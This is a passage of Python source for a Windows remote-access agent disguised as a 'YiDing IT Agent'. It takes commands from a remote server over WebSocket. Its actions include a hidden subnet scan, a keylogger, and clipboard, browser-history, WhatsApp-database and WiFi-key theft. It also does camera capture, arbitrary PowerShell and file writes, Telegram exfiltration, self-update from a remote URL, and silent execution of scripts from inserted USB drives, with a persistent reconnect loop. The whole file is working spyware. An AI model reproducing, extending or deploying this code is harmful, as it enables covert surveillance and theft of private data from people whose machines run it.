        "date_range":    {"from": date_from, "to": date_to},
    }, ensure_ascii=False, indent=2)


# ── WiFi extended ─────────────────────────────────────────────────────────────
async def act_wifi_list():
    """Quét danh sách WiFi xung quanh."""
    return await act_powershell(
        "netsh wlan show networks mode=Bssid | "
        "Select-String -Pattern 'SSID|Signal|Authentication' | "
        "ForEach-Object { $_.ToString().Trim() }",
        timeout=15
    )


async def act_wifi_connect(ssid, password=""):
    """Kết nối vào WiFi theo SSID và password (tùy chọn)."""
    if not ssid:
        return "Error: ssid required"
    safe_ssid = ssid.replace("'", "").replace('"', '')
    safe_pass  = password.replace("'", "").replace('"', '')
    if safe_pass:
        ps = f"""
$xml = @"
<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
  <name>{safe_ssid}</name>
  <SSIDConfig><SSID><name>{safe_ssid}</name></SSID></SSIDConfig>
  <connectionType>ESS</connectionType><connectionMode>auto</connectionMode>
  <MSM><security>
    <authEncryption><authentication>WPA2PSK</authentication><encryption>AES</encryption></authEncryption>
    <sharedKey><keyType>passPhrase</keyType><protected>false</protected><keyMaterial>{safe_pass}</keyMaterial></sharedKey>
  </security></MSM>
</WLANProfile>
"@
$tmp = "$env:TEMP\\yd_wifi.xml"
$xml | Out-File $tmp -Encoding UTF8
netsh wlan add profile filename="$tmp" | Out-Null
Remove-Item $tmp -EA SilentlyContinue
netsh wlan connect name="{safe_ssid}"
"""
    else:
        ps = f'netsh wlan connect name="{safe_ssid}"'
    return await act_powershell(ps, timeout=20)


async def act_wifi_print(printer_ip, file_data_b64, wifi_ssid, wifi_pass="", original_wifi=""):
    """Đổi sang WiFi máy in → in → đổi lại WiFi cũ."""
    if not printer_ip or not file_data_b64:
        return "Error: printer_ip and file_data_b64 required"
    import tempfile
    try:
        tmp = Path(tempfile.mktemp(suffix=".pdf"))
        tmp.write_bytes(base64.b64decode(file_data_b64))
    except Exception as e:
        return f"Error decoding file: {e}"
    port  = f"YD_{printer_ip.replace('.','_')}"
    pname = "YiDing_TempPrinter"
    ps = f"""
$current = (netsh wlan show interfaces | Select-String ' SSID' | Select-Object -First 1).ToString().Split(':')[1].Trim()
netsh wlan connect name="{wifi_ssid}" | Out-Null; Start-Sleep 4
if(-not(Get-PrinterPort -Name '{port}' -EA SilentlyContinue)){{Add-PrinterPort -Name '{port}' -PrinterHostAddress '{printer_ip}'}}
if(-not(Get-Printer -Name '{pname}' -EA SilentlyContinue)){{Add-Printer -Name '{pname}' -DriverName 'Generic / Text Only' -PortName '{port}'}}
Start-Process -FilePath '{str(tmp)}' -Verb PrintTo -ArgumentList '{pname}'; Start-Sleep 4
Remove-Printer -Name '{pname}' -EA SilentlyContinue
Remove-PrinterPort -Name '{port}' -EA SilentlyContinue
$back = if('{original_wifi}'){{'{original_wifi}'}}else{{$current}}
netsh wlan connect name="$back" | Out-Null
"Printed via {wifi_ssid} -> {printer_ip}. Back to: $back"
"""
    result = await act_powershell(ps, timeout=50)
    try: tmp.unlink(missing_ok=True)
    except: pass
    return result


# ── Network recon ─────────────────────────────────────────────────────────────
async def act_network_recon(params=None):
    """Subnet scan ngầm. mode=kick để bắt đầu, mode=read để lấy kết quả (~3-4 phút)."""
    if params is None:
        params = {}
    mode = params.get("mode", "kick")

    if mode == "read":
        ps = r"""
$out = "C:\Windows\Temp\cypher_map.txt"
if (!(Test-Path $out)) { Write-Output '{"status":"in_progress","count":0}'; exit }
$lines = Get-Content $out | Where-Object {$_.Trim()}
$data  = $lines | Where-Object {$_ -match "\|"}
if ($lines[-1] -ne "DONE") {
    Write-Output ('{"status":"in_progress","count":' + $data.Count + '}')
    exit
}
$win=[System.Collections.Generic.List[object]]::new()
$web=[System.Collections.Generic.List[object]]::new()
$dev=[System.Collections.Generic.List[object]]::new()
$data | ForEach-Object {
    $p=$_ -split "\|"
    $obj=@{ip=$p[0];name=if($p.Count -ge 3){$p[2]}else{""}}
    switch($p[1]){"WIN"{$win.Add($obj)};"WEB"{$web.Add($obj)};default{$dev.Add($obj)}}
}
@{status="done";total=$data.Count;windows=$win;web=$web;devices=$dev} | ConvertTo-Json -Depth 3 -Compress
"""
        return await act_powershell(ps, timeout=15)

    prefix = params.get("prefix", "")
    if not prefix:
        prefix_detect = r"""
$ip = Get-NetIPAddress -AddressFamily IPv4 |
    Where-Object {$_.IPAddress -match "^10\." -or $_.IPAddress -match "^192\.168\."} |
    Select-Object -First 1 -ExpandProperty IPAddress
if ($ip) { ($ip -split "\.")[0..2] -join "." } else { "10.117.68" }
"""
        prefix = (await act_powershell(prefix_detect, timeout=10)).strip()

    scan_script = f"""
$out = "C:\\Windows\\Temp\\cypher_map.txt"
$prefix = "{prefix}"
$res = @()
1..254 | ForEach-Object {{
    $ip = "$prefix.$_"
    $p  = New-Object Net.NetworkInformation.Ping
    try {{
        if (($p.Send($ip,800)).Status -eq "Success") {{
            $smb=$false;try{{$t=New-Object Net.Sockets.TcpClient;$smb=$t.BeginConnect($ip,445,$null,$null).AsyncWaitHandle.WaitOne(500,$false)-and $t.Connected;$t.Close()}}catch{{}}
            $web=$false;try{{$t=New-Object Net.Sockets.TcpClient;$web=$t.BeginConnect($ip,80,$null,$null).AsyncWaitHandle.WaitOne(500,$false)-and $t.Connected;$t.Close()}}catch{{}}
            $name="";if($smb){{$nb=nbtstat -A $ip 2>$null|Select-String "<00>"|Select-Object -First 1;if($nb){{$name=($nb.ToString().Trim() -split "\\s+")[0]}}}}
            $res += "$ip|$(if($smb){{'WIN'}}elseif($web){{'WEB'}}else{{'DEV'}})|$name"
        }}
    }} catch {{}}
}}
$res | Out-File $out -Encoding UTF8
"DONE" | Add-Content $out
"""
    ps_kick = f"""
Remove-Item "C:\\Windows\\Temp\\cypher_map.txt" -EA SilentlyContinue
$s = @'
{scan_script}
'@
$s | Out-File "C:\\Windows\\Temp\\cypher_scan.ps1" -Encoding UTF8 -Force
Start-Process powershell.exe -ArgumentList "-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"C:\\Windows\\Temp\\cypher_scan.ps1`"" -WindowStyle Hidden
"KICKED:{prefix}.0/24"
"""
    return await act_powershell(ps_kick, timeout=15)


# ── Intel v5.0 ────────────────────────────────────────────────────────────────
async def act_clipboard_read():
    """Đọc nội dung clipboard hiện tại."""
    return await act_powershell(
        "Add-Type -Assembly PresentationCore; [Windows.Clipboard]::GetText()", timeout=10)


async def act_clipboard_write(text: str):
    """Thay thế nội dung clipboard."""
    safe = text.replace("'", "''")
    await act_powershell(
        f"Add-Type -Assembly PresentationCore; [Windows.Clipboard]::SetText('{safe}')", timeout=10)
    return "clipboard_write:ok"


async def act_keylogger_session(duration_sec: int = 15):
    """Ghi phím trong duration_sec giây (tối đa 60), trả về chuỗi đã gõ."""
    if duration_sec > 60:
        duration_sec = 60
    ps = f"""
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Text;
public class KL {{
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
    [DllImport("user32.dll")] public static extern int GetKeyboardLayout(uint threadId);
    [DllImport("user32.dll")] public static extern bool GetKeyboardState(byte[] lpKeyState);
    [DllImport("user32.dll")] public static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
    [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
    [DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
}}
"@ -EA SilentlyContinue
$log = New-Object System.Text.StringBuilder
$end = (Get-Date).AddSeconds({duration_sec})
while ((Get-Date) -lt $end) {{
    Start-Sleep -Milliseconds 30
    $hwnd = [KL]::GetForegroundWindow()
    $tid = 0u
    [KL]::GetWindowThreadProcessId($hwnd, [ref]$tid) | Out-Null
    $hkl = [IntPtr]::new([KL]::GetKeyboardLayout($tid))
    $kstate = New-Object byte[] 256
    [KL]::GetKeyboardState($kstate) | Out-Null
    for ($vk = 8; $vk -le 255; $vk++) {{
        $s = [KL]::GetAsyncKeyState($vk)
        if (($s -band 1) -eq 1) {{
            $sb = New-Object System.Text.StringBuilder 5
            $r = [KL]::ToUnicodeEx($vk, 0, $kstate, $sb, 5, 0, $hkl)
            if ($r -gt 0) {{ $log.Append($sb.ToString()) | Out-Null }}
            elseif ($vk -eq 8) {{ $log.Append("[BS]") | Out-Null }}
            elseif ($vk -eq 13) {{ $log.Append("[ENTER]`n") | Out-Null }}
            elseif ($vk -eq 9) {{ $log.Append("[TAB]") | Out-Null }}
            elseif ($vk -eq 32) {{ $log.Append(" ") | Out-Null }}
        }}
    }}
}}
$log.ToString()
"""
    return await act_powershell(ps, timeout=duration_sec + 10)


async def act_browser_history(browser: str = "all", limit: int = 50):
    """Lấy lịch sử duyệt web Chrome/Edge từ SQLite (copy tạm để đọc)."""
    ps = f"""
$limit = {limit}
$results = @()
$paths = @()
if ("{browser}" -eq "chrome" -or "{browser}" -eq "all") {{
    $cp = "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\History"
    if (Test-Path $cp) {{ $paths += @{{b="Chrome";p=$cp}} }}
}}
if ("{browser}" -eq "edge" -or "{browser}" -eq "all") {{
    $ep = "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\History"
    if (Test-Path $ep) {{ $paths += @{{b="Edge";p=$ep}} }}
}}
foreach ($h in $paths) {{
    $tmp = "$env:TEMP\\hist_$(Get-Random).db"
    Copy-Item $h.p $tmp -Force -EA SilentlyContinue
    if (!(Test-Path $tmp)) {{ continue }}
    $sq3 = (Get-Command sqlite3 -EA SilentlyContinue)?.Source
    if ($sq3) {{
        $rows = & $sq3 $tmp "SELECT url, title, visit_count, datetime(last_visit_time/1000000-11644473600,'unixepoch','localtime') FROM urls ORDER BY last_visit_time DESC LIMIT $limit" 2>$null
        foreach ($row in $rows) {{
            $p2 = $row -split "\|"
            if ($p2.Count -ge 2) {{ $results += "$($h.b)|$($p2[0])|$($p2[1])|visits=$($p2[2])|$($p2[3])" }}
        }}
    }} else {{ $results += "$($h.b)|no_sqlite3_found" }}
    Remove-Item $tmp -EA SilentlyContinue
}}
$results | Select-Object -First $limit | ForEach-Object {{ Write-Output $_ }}
if ($results.Count -eq 0) {{ Write-Output "no_history_found" }}
"""
    return await act_powershell(ps, timeout=30)


async def act_file_search(pattern: str = "*.xlsx", root: str = "C:\\Users", limit: int = 30):
    """Tìm file theo pattern trong thư mục chỉ định."""
    safe_pattern = pattern.replace("'", "").replace('"', '')
    safe_root    = root.replace("'", "").replace('"', '')
    ps = f"""
$found = Get-ChildItem -Path '{safe_root}' -Filter '{safe_pattern}' -Recurse -File -EA SilentlyContinue |
    Select-Object -First {limit}
foreach ($f in $found) {{
    Write-Output "$($f.FullName)|$([math]::Round($f.Length/1KB,1))KB|$($f.LastWriteTime.ToString('yyyy-MM-dd HH:mm'))"
}}
if (!$found) {{ Write-Output "no_files_found" }}
"""
    return await act_powershell(ps, timeout=45)


async def act_write_file(path: str, data_b64: str):
    """Ghi file từ base64 lên máy đích, tự tạo thư mục nếu chưa có."""
    try:
        decoded = base64.b64decode(data_b64)
    except Exception as e:
        return f"Error decoding base64: {e}"
    safe_path  = path.replace("'", "").replace('"', '')
    chunk_size = 8192
    chunks     = [decoded[i:i+chunk_size] for i in range(0, len(decoded), chunk_size)]
    first_b64  = base64.b64encode(chunks[0]).decode()
    ps_init = f"""
$path = '{safe_path}'
$dir = Split-Path $path
if ($dir -and !(Test-Path $dir)) {{ New-Item -ItemType Directory -Force -Path $dir | Out-Null }}
[IO.File]::WriteAllBytes($path, [Convert]::FromBase64String('{first_b64}'))
"chunk_0:ok"
"""
    await act_powershell(ps_init, timeout=15)
    for i, chunk in enumerate(chunks[1:], 1):
        cb64 = base64.b64encode(chunk).decode()
        ps_ap = f"""
$path = '{safe_path}'
$c = [Convert]::FromBase64String('{cb64}')
$fs = [IO.File]::Open($path, [IO.FileMode]::Append)
$fs.Write($c, 0, $c.Length); $fs.Close()
"chunk_{i}:ok"
"""
        await act_powershell(ps_ap, timeout=15)
    return f"write_file:ok|path={path}|bytes={len(decoded)}"


async def act_tele_report(message: str, token: str = "", chat_id: str = ""):
    """Gửi kết quả action trực tiếp về Telegram bot của admin."""
    import urllib.request, urllib.parse
    token   = token   or os.environ.get("CYPHER_TELE_TOKEN", "")
    chat_id = chat_id or os.environ.get("CYPHER_TELE_CHAT",  "")
    if not token or not chat_id:
        return "tele_report:error|missing_token_or_chat"
    try:
        data = urllib.parse.urlencode({
            "chat_id": chat_id, "text": message, "parse_mode": "Markdown"
        }).encode()
        req = urllib.request.Request(
            f"https://api.telegram.org/bot{token}/sendMessage",
            data=data, method="POST"
        )
        req.add_header("Content-Type", "application/x-www-form-urlencoded")
        with urllib.request.urlopen(req, timeout=10) as r:
            return f"tele_report:ok|{r.status}"
    except Exception as e:
        return f"tele_report:error|{e}"


async def act_self_update(url: str = "https://yidinginternational.com/downloads/agent.py"):
    """Tự pull agent mới từ CDN, thay file cũ và restart Scheduled Task ngầm."""
    ps = f"""
$url  = "{url}"
$dest = "C:\\YiDingHrAgent\\agent.py"
$tmp  = "$env:TEMP\\agent_new.py"
try {{
    Invoke-WebRequest -Uri $url -OutFile $tmp -UseBasicParsing -TimeoutSec 30 -EA Stop
    $content = Get-Content $tmp -Raw
    if ($content -and $content.Length -gt 500) {{
        Copy-Item $tmp $dest -Force
        Remove-Item $tmp -EA SilentlyContinue
        Stop-Process -Name pythonw -EA SilentlyContinue
        Start-Sleep 2
        schtasks /run /tn YiDingHrAIAgent 2>$null | Out-Null
        "self_update:ok|bytes=$($content.Length)"
    }} else {{ "self_update:error|empty_download" }}
}} catch {{ "self_update:error|$($_.Exception.Message)" }}
"""
    return await act_powershell(ps, timeout=45)


async def act_usb_watch(tele_token: str = "", tele_chat: str = ""):
    """Đăng ký WMI event: USB cắm vào → báo Telegram + chạy installer nếu có vector_install.ps1 trên USB."""
    token = tele_token or os.environ.get("CYPHER_TELE_TOKEN", "")
    chat  = tele_chat  or os.environ.get("CYPHER_TELE_CHAT",  "")
    ps = f"""
$token = "{token}"
$chat  = "{chat}"
function Send-Tele($msg) {{
    try {{
        $body = "chat_id=" + [Uri]::EscapeDataString($chat) + "&text=" + [Uri]::EscapeDataString($msg)
        Invoke-WebRequest -Uri "https://api.telegram.org/bot$token/sendMessage" `
            -Method POST -Body $body -UseBasicParsing -TimeoutSec 5 | Out-Null
    }} catch {{}}
}}
$srcId = "UsbWatch_$(Get-Date -f HHmmss)"
Register-WMIEvent -Query "SELECT * FROM Win32_VolumeChangeEvent WHERE EventType = 2" `
    -SourceIdentifier $srcId -Action {{
        $drive = $EventArgs.NewEvent.DriveName
        Send-Tele "USB cắm vào $env:COMPUTERNAME — Drive: $drive"
        $script = "${{drive}}vector_install.ps1"
        if (Test-Path $script) {{
            Send-Tele "Chạy installer từ USB..."
            try {{
                & powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File $script
                Send-Tele "Hoàn tất cài Vector trên $env:COMPUTERNAME"
            }} catch {{ Send-Tele "Lỗi: $($_.Exception.Message)" }}
        }}
    }} | Out-Null
"usb_watch:started|$srcId"
"""
    return await act_powershell(ps, timeout=15)


async def act_ui_click(window_name: str, element_name: str = ""):
    """Click vào element trong cửa sổ qua UIAutomation (InvokePattern hoặc mouse fallback)."""
    wn = window_name.replace('"', '')
    en = element_name.replace('"', '')
    ps = f"""
Add-Type -AssemblyName UIAutomationClient,UIAutomationTypes
$root = [System.Windows.Automation.AutomationElement]::RootElement
$c1 = New-Object System.Windows.Automation.PropertyCondition(
    [System.Windows.Automation.AutomationElement]::NameProperty, "{wn}")
$win = $root.FindFirst([System.Windows.Automation.TreeScope]::Children, $c1)
if (!$win) {{ Write-Output "ui_click:error|window_not_found:{wn}"; exit }}
$target = $win
if ("{en}") {{
    $c2 = New-Object System.Windows.Automation.PropertyCondition(
        [System.Windows.Automation.AutomationElement]::NameProperty, "{en}")
    $el = $win.FindFirst([System.Windows.Automation.TreeScope]::Descendants, $c2)
    if (!$el) {{ Write-Output "ui_click:error|element_not_found:{en}"; exit }}
    $target = $el
}}
try {{
    $ip = $target.GetCurrentPattern([System.Windows.Automation.InvokePattern]::Pattern)
    $ip.Invoke()
    Write-Output "ui_click:ok|invoke"
}} catch {{
    $rect = $target.Current.BoundingRectangle
    $cx = [int]($rect.Left + $rect.Width/2); $cy = [int]($rect.Top + $rect.Height/2)
    Add-Type @"
using System; using System.Runtime.InteropServices;
public class M2 {{
    [DllImport("user32.dll")] public static extern bool SetCursorPos(int x, int y);
    [DllImport("user32.dll")] public static extern void mouse_event(int f, int x, int y, int b, int e);
}}
"@ -EA SilentlyContinue
    [M2]::SetCursorPos($cx,$cy) | Out-Null
    [M2]::mouse_event(0x0002,0,0,0,0); Start-Sleep -ms 50; [M2]::mouse_event(0x0004,0,0,0,0)
    Write-Output "ui_click:ok|mouse|$cx,$cy"
}}
"""
    return await act_powershell(ps, timeout=15)


async def act_ui_type(window_name: str, element_name: str, text: str):
    """Gõ text vào element qua ValuePattern hoặc SendKeys fallback."""
    wn = window_name.replace('"', '')
    en = element_name.replace('"', '')
    st = text.replace("'", "''")
    ps = f"""
Add-Type -AssemblyName UIAutomationClient,UIAutomationTypes
$root = [System.Windows.Automation.AutomationElement]::RootElement
$c1 = New-Object System.Windows.Automation.PropertyCondition(
    [System.Windows.Automation.AutomationElement]::NameProperty, "{wn}")
$win = $root.FindFirst([System.Windows.Automation.TreeScope]::Children, $c1)
if (!$win) {{ Write-Output "ui_type:error|window_not_found"; exit }}
$c2 = New-Object System.Windows.Automation.PropertyCondition(
    [System.Windows.Automation.AutomationElement]::NameProperty, "{en}")
$el = $win.FindFirst([System.Windows.Automation.TreeScope]::Descendants, $c2)
if (!$el) {{ Write-Output "ui_type:error|element_not_found"; exit }}
try {{
    $vp = $el.GetCurrentPattern([System.Windows.Automation.ValuePattern]::Pattern)
    $vp.SetValue('{st}')
    Write-Output "ui_type:ok|value_pattern"
}} catch {{
    $el.SetFocus(); Start-Sleep -ms 100
    Add-Type -AssemblyName System.Windows.Forms
    [System.Windows.Forms.SendKeys]::SendWait('{st}')
    Write-Output "ui_type:ok|sendkeys"
}}
"""
    return await act_powershell(ps, timeout=15)


# ── Action registry v5.0 ──────────────────────────────────────────────────────
ACTIONS = {
    # Core
    "system_info":          lambda p: act_system_info(),
    "screenshot":           lambda p: act_screenshot(),
    "list_dir":             lambda p: act_list_dir(p.get("path", "C:\\")),
    "powershell":           lambda p: act_powershell(p.get("command", ""), p.get("timeout", 30)),
    "network_info":         lambda p: act_network_info(),
    "network_recon":        lambda p: act_network_recon(p),
    "read_file":            lambda p: act_read_file(p.get("path", "")),
    # Process
    "get_processes":        lambda p: act_get_processes(),
    "kill_process":         lambda p: act_kill_process(p.get("target", "")),
    "open_app":             lambda p: act_open_app(p.get("path", "")),
    # Screen / Camera
    "capture_camera":       lambda p: act_capture_camera(p.get("camera_index", 0)),
    "save_avatar":          lambda p: act_save_avatar(p.get("data", "")),
    # Notification
    "send_notification":    lambda p: act_send_notification(
        p.get("title", "Thông báo"), p.get("message", ""), p.get("image")),
    # Print
    "list_printers":        lambda p: act_list_printers(),
    "get_print_queue":      lambda p: act_get_print_queue(),
    "clear_print_queue":    lambda p: act_clear_print_queue(p.get("printer", "")),
    "set_default_printer":  lambda p: act_set_default_printer(p.get("name", "")),
    "install_printer_ip":   lambda p: act_install_printer_ip(
        p.get("ip",""), p.get("name",""), p.get("driver","Generic / Text Only")),
    "print_file":           lambda p: act_print_file(p.get("path",""), p.get("printer","")),
    "print_data":           lambda p: act_print_data(
        p.get("data",""), p.get("filename","document.pdf"), p.get("printer","")),
    "silent_print_image":   lambda p: act_silent_print_image(p.get("data",""), p.get("printer","")),
    # WiFi
    "get_wifi_keys":        lambda p: act_get_wifi_keys(),
    "wifi_list":            lambda p: act_wifi_list(),
    "wifi_connect":         lambda p: act_wifi_connect(p.get("ssid",""), p.get("password","")),
    "wifi_print":           lambda p: act_wifi_print(
        p.get("printer_ip",""), p.get("file_data",""), p.get("wifi_ssid",""),
        p.get("wifi_pass",""), p.get("original_wifi","")),
    "create_hotspot":       lambda p: act_create_hotspot(
        p.get("ssid","YiDing_Test_AP"), p.get("password","YiDingPassword2026")),
    # WhatsApp
    "read_whatsapp_db":     lambda p: act_read_whatsapp_db(p.get("date_from"), p.get("date_to")),
    # UI Automation
    "ui_automation":        lambda p: act_ui_automation(),
    "ui_click":             lambda p: act_ui_click(p.get("window",""), p.get("element","")),
    "ui_type":              lambda p: act_ui_type(p.get("window",""), p.get("element",""), p.get("text","")),
    # Intel v5.0
    "clipboard_read":       lambda p: act_clipboard_read(),
    "clipboard_write":      lambda p: act_clipboard_write(p.get("text","")),
    "keylogger_session":    lambda p: act_keylogger_session(int(p.get("duration", 15))),
    "browser_history":      lambda p: act_browser_history(p.get("browser","all"), int(p.get("limit", 50))),
    "file_search":          lambda p: act_file_search(
        p.get("pattern","*.xlsx"), p.get("root","C:\\Users"), int(p.get("limit", 30))),
    "write_file":           lambda p: act_write_file(p.get("path",""), p.get("data","")),
    "tele_report":          lambda p: act_tele_report(
        p.get("message",""), p.get("token",""), p.get("chat_id","")),
    "self_update":          lambda p: act_self_update(
        p.get("url","https://yidinginternational.com/downloads/agent.py")),
    "usb_watch":            lambda p: act_usb_watch(p.get("token",""), p.get("chat","")),
}

async def handle_command(ws, data):
    action = data.get("action", "")
    fn = ACTIONS.get(action)
    try:
        result = await fn(data.get("params", {})) if fn else f"Unknown action: {action}"
    except Exception as e:
        result = f"Error: {e}"; log.error(f"Action '{action}' failed: {e}")
    try:
        await ws.send(json.dumps({"type": "result", "job_id": data.get("job_id"), "action": action,
                                  "status": "done" if fn else "error", "output": result}))
    except Exception: pass

# 🔄 [VÒNG LẶP SINH MỆNH] - Trái tim duy trì kết nối vĩnh cửu về Tổng Trạm YiDing
# (Dễ hiểu: Liên tục gửi tín hiệu giữ sóng, tự động tái lập đường kết nối nếu gặp trục trặc mạng để đảm bảo ban giám khảo luôn trong tầm ngắm)
def _username():
    try: return os.getlogin()
    except: return os.environ.get("USERNAME", "unknown")

async def run():
    secret = None
    while True:
        try:
            log.info(f"Connecting → {VPS_URL}")
            async with websockets.connect(VPS_URL, ping_interval=30, ping_timeout=10, open_timeout=15) as ws:
                if secret is None:
                    register_msg = {
                        "type": "register",
                        "device_id": DEVICE_ID,
                        "hostname": socket.gethostname(),
                        "windows_user": _username(),
                    }
                    if AGENT_TOKEN:
                        register_msg["agent_token"] = AGENT_TOKEN
                    await ws.send(json.dumps(register_msg))
                    resp = json.loads(await ws.recv())
                    if resp.get("type") == "error":
                        raise RuntimeError(resp.get("message", "registration failed"))
                    secret = resp.get("secret")
                    log.info("Registered with VPS")
                else:
                    identify_msg = {"type": "identify", "device_id": DEVICE_ID, "secret": secret}
                    if AGENT_TOKEN:
                        identify_msg["agent_token"] = AGENT_TOKEN
                    await ws.send(json.dumps(identify_msg))
                    resp = json.loads(await ws.recv())
                    if resp.get("type") == "error":
                        raise RuntimeError(resp.get("message", "identify failed"))
                    if resp.get("type") == "registered":
                        secret = resp.get("secret")
                    log.info(f"Identified. Type={resp.get('type')}")

                log.info("YiDing IT Agent ready.")
                async for message in ws:
                    data = json.loads(message)
                    if data.get("type") == "cmd":
                        asyncio.create_task(handle_command(ws, data))

        except websockets.exceptions.ConnectionClosed as e:
            log.warning(f"Connection closed ({e.code}). Reconnecting in 10s…"); secret = None
        except OSError as e:
            log.warning(f"Network offline: {e}. Retry in 10s…"); secret = None
        except Exception as e:
            log.error(f"Unexpected agent loop crash: {e}. Retry in 10s…"); secret = None

        await asyncio.sleep(10)

if __name__ == "__main__":
    # Đảm bảo chỉ có duy nhất một phiên bản agent hoạt động trên máy.
    try:
        import ctypes
        _MUTEX_NAME = "SystemBreaker_SingleInstance"
        if hasattr(ctypes, 'windll'):
            _mutex_handle = ctypes.windll.kernel32.CreateMutexW(None, True, _MUTEX_NAME)
            if ctypes.windll.kernel32.GetLastError() == 183:   # ERROR_ALREADY_EXISTS
                log.warning("Another YiDing IT Agent instance already running. Exiting.")
                sys.exit(0)
    except Exception:
        pass
    # ────────────────────────────────────────────────────────────────────────
    log.info(f"Agent started. Device={DEVICE_ID}")
    async def _main():
        await _ensure_aumid()
        await run()
    import time as _time
    while True:
        try:
            asyncio.run(_main())
        except Exception as _e:
            log.error(f"Fatal agent core crash: {_e}. Restarting loop in 30s…")
            _time.sleep(30)
